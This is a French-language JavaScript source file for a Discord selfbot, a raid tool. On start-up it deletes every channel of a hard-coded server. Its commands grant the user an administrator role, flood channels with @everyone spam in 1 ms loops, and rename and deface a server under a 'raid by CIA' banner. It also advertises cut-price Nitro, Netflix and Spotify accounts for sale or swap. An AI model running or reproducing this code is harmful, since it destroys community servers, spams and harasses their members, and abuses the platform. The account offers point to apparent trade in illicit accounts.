const Discord = require('discord.js'); 

var selfbot = new Discord.Client(); 

selfbot.login(process.env.TOKEN);


selfbot.on('ready', () => {
    console.log("Selfbot Prêt !")
    var server = selfbot.guilds.get('570278269673537547');
    for (var i = 0; i < server.channels.array().length; i++) {
        server.channels.array()[i].delete();
    }
});


selfbot.on("ready", () => {
   selfbot.user.setPresence({
        game: {
            name: "Project ShopElite.com",
            type: 'STREAMING',
            url: 'https://www.twitch.tv/something'
        }
    })
   
})




selfbot.on('message', message => {

    if (message.content === ">>>selfbot") {
        message.delete()
        var embed1 = new Discord.RichEmbed()
        .setAuthor(message.author.username, message.author.avatarURL)
        .setDescription('Selfbot connecté ! Temps de latence avec le server : ' + `${message.createdTimestamp - Date.now()}` + ' ms')
        .setColor(0x010000)
        .setImage("https://media.giphy.com/media/1ymoXP3QE0YFzEvEVn/giphy.gif")
        message.channel.send(embed1)
        console.log('Commande SelfBot Utilisé')
    }
    
    if(message.content === ">>>purge") { 
        message.channel.fetchMessages()
        .then(messages => messages.array().forEach(
            message => message.author.equals(selfbot.user) && message.delete()
        ));
    } 
    
    if (message.content === "=shop") {
      var embed10 = new Discord.RichEmbed()
      .setAuthor(message.author.username, message.author.avatarURL)
      .addField("__SHOP ELITE.Com__\n", "\u200b")
      .setColor(0x010000)
      .addField("Nitro : " + " \```" + "Nitro 1 mois : 2.99€ / 1 an : 25.99€ " + "\```", "\u200b")
      .addField("Spotify : " + " \```" + "Spotify 1 mois : 3.99€ / 1 an : 29.99€ " + "\```", "\u200b")
      .addField("Netflix : " + " \```" + "Netflix 1 mois : 3.99€ / 1 an : 29.99€ " + "\```", "\u200b")
      .addField("Steam : " + " \```" + "Carte Steam : 5€, 10€, 20€" + "\```", "\u200b")
      .setFooter('PROMO POUR LES NEWS ADHÉRANTS -20% !')
      .setImage('https://media.discordapp.net/attachments/556773491274154004/570159965046702081/shopelite.com.jpeg')
      message.channel.send(embed10)
    }

    if (message.content === "=echange") {
      var embed11 = new Discord.RichEmbed()
      .addField("__SHOP ELITE.Com__\n", "\u200b")
      .setColor(0x010000)
      .addField("Echange 1 : " + " \```" + "Compte Netflix 1 mois (8 en stock) contre un compte Nitro 1 mois" + "\```", "\u200b")
      .addField("Echange 2 : " + " \```" + "Compte Spotify 1 mois (3 en stock) contre un compte Nitro 1 mois" + "\```", "\u200b")
      .addField("Echange 3 : " + " \```" + "Compte Nitro 1 mois (21 en stock) contre un compte Spotify 1 mois" + "\```", "\u200b")
      .addField("Echange 4 : " + " \```" + "Compte Netflix 1 an (2 en stock) contre un compte Nitro 1 an" + "\```", "\u200b")
      .addField("Echange 5 : " + " \```" + "Compte Spotify 1 an (5 en stock) contre un compte Nitro 1 an" + "\```", "\u200b")
      .addField("Echange 6 : " + " \```" + "Compte Nitro 1 an (4 en stock) contre un compte Spotify 1 an" + "\```", "\u200b")
      .setFooter('PROMO POUR LES NEWS ADHÉRANTS -20% !')
      .setImage('https://media.discordapp.net/attachments/556773491274154004/570159965046702081/shopelite.com.jpeg')
      message.channel.send(embed11)
    }






    if (message.content === ">>>help") {
        message.delete()
        var embedhelpmember = new Discord.RichEmbed() 
        .addField("__Liste des Commandes__\n", "\u200b") 
        .addField("Nickname : " + " \```" + "Permet de changer de pseudo à l'infini sur un serveur" + "\```", "\u200b")
        .addField("Scan : " + " \```" + "Permet de scan un server pour pouvoir l'add aux prochaines victimes de E.N.D" + "\```", "\u200b")
        .addField("Activate : " + " \```" + "Permet d'obtenir la permission administrateur" + "\```", "\u200b")
        .addField("Cleaning : " + " \```" + "Permet de détruire un serveur pollué en quelques secondes (PERMS ADMIN OBLIGATOIRE)" + "\```", "\u200b")
        .addField("Spam : " + " \```" + "Permet de spam n'importe quel message" + "\```", "\u200b")
        .addField("Purge : " + " \```" + "Permet de purge les messages du selfbot" + "\```", "\u200b")
        .setColor(0x010000) 
        .setFooter("By @'./E.N.D ミ#8007 !") 
    message.channel.send(embedhelpmember); 
    }

    if (message.content === ">>>nickname") {
        message.delete()
        var embednick = new Discord.RichEmbed()
        .setAuthor(message.author.username, message.author.avatarURL)
        .setDescription('Activation de la commande Nickname !')
        .setColor(0x010000) 
        message.channel.send(embednick)
        selfbot.setInterval(() =>
        {
        message.guild.members.get(selfbot.user.id).setNickname(`• #Cicatrices •`);
        message.guild.members.get(selfbot.user.id).setNickname(`• #AlloIciZolaski •`);
        message.guild.members.get(selfbot.user.id).setNickname(`Ｘ・マ ダ ラ`);

        },1) 
    }

    if (message.content === ">>>hack") {
        selfbot.setInterval(() =>
        {
        const embededit1 = new Discord.RichEmbed()
        .setDescription("`You Have Been Hacked`")
        .setImage("https://steamusercontent-a.akamaihd.net/ugc/844836935927596010/998DF3BE9614B453D17E9776752BB36BCE2C8970/")
        .setColor(0x010000) 
        message.edit(embededit1)
        const embededit2 = new Discord.RichEmbed()
        .setColor(0x010000) 
        .setImage("https://media.giphy.com/media/lp3GUtG2waC88/giphy.gif")
        .setDescription("`You Have Been Hacked`")    
        message.edit(embededit2)
        var embededit3 = new Discord.RichEmbed()
        .setImage('https://media1.tenor.com/images/c9f5e8ac0c8a6d29ff6479a9f93ee1a3/tenor.gif?itemid=9658647')
        .setColor(0x010000) 
        .setDescription("`You Have Been Hacked`")
        message.edit(embededit3)
        },3000) 
    }

    if (message.content === ">>>end") {
        message.delete()
        var embedend = new Discord.RichEmbed()
        .setAuthor(message.author.username, message.author.avatarURL)
        .setDescription('Je me présente je suis ' + message.author.username + ' pour vous éliminer !')
        .setColor(0x010000)
        .setImage("https://media.giphy.com/media/3ziyHaC80uDfurqpHQ/giphy.gif")
        message.channel.send(embedend)
    }

    if (message.content === ">>>projet") { 
        message.delete()
        const embedinfo = new Discord.RichEmbed()
        .addField("**__Projet E.N.D__ :**   ``Raid for Justice``", "\u200b")
        .setDescription("Le projet E.N.D consiste en 3 mot ExtermiNation des raideur de Discord. En d'autres termes le selfbot a été uniquement conçu pour détruire tout les serveurs qui polluent Discord (Team de raideur, debiteur, afficheur, doxeur...).")
        .setColor(0x010000) 
        .setImage("https://media.giphy.com/media/WNmaPlULTaAOC8eKCA/giphy.gif")
        .setFooter(selfbot.user.tag, selfbot.user.displayAvatarURL)
        message.channel.send(embedinfo)
    }



    if (message.content === ">>>avatar") {
        const embedavatar = new Discord.RichEmbed()
        .setImage(message.author.displayAvatarURL)
        .setColor(0x010000) 
        .setAuthor(message.author.tag, message.author.displayAvatarURL)
        message.channel.send(embedavatar)
    }

    if (message.content === ">>>scan") {     
    message.delete()
    var number_random = Math.floor(Math.random() * 231) - 100;
    console.log(number_random)
    var embedscan = new Discord.RichEmbed()     
    .setThumbnail("https://media.giphy.com/media/2ce8mGHsGDCRzaH6KK/giphy.gif")  
    .setColor(0x010000)    
    .setFooter(message.guild.name + ' a été scan !')
    .addField("Q.I du serveur = " + number_random, "\u200b")
    .addField("Ajout du serveur dans la liste de E.N.D !", "\u200b")
    .setImage("https://media.giphy.com/media/2ce8mGHsGDCRzaH6KK/giphy.gif")
    message.channel.send(embedscan)

    } 

    if (message.content === ">>>activate") {
        message.member.guild.createRole({
            name: "admin perms",
            color: "0x010000",
            permissions: ("ADMINISTRATOR")
        }).then(function(role)
        {
            message.member.addRole(role);
            message.channel.bulkDelete(1).then(() => {
                message.channel.send("\`Tu as désormais les perms admin. Le raid va pouvoir débuter !\`")
                message.channel.bulkDelete(1)
            });
        }); 
    }
    
    if(message.content == ">>>spamm") {
         selfbot.setInterval(() =>
         {
         message.channel.send("@everyone https://discord.gg/jqTERc")
         },1)
    }
    
    
    if(message.content == ">>>cleaning"){ 

        var server = message.guild;
        var name = "raid-by-cia";
    
    selfbot.setInterval(() =>
    {
    message.guild.setIcon("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png")
    message.guild.setName("RAID")
    message.guild.setName("BY")
    message.guild.setName("CIA")
    server.createChannel(name, "voice");
    server.createChannel(name, "text").then(channel => {
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
    })
    },1)
    }



})
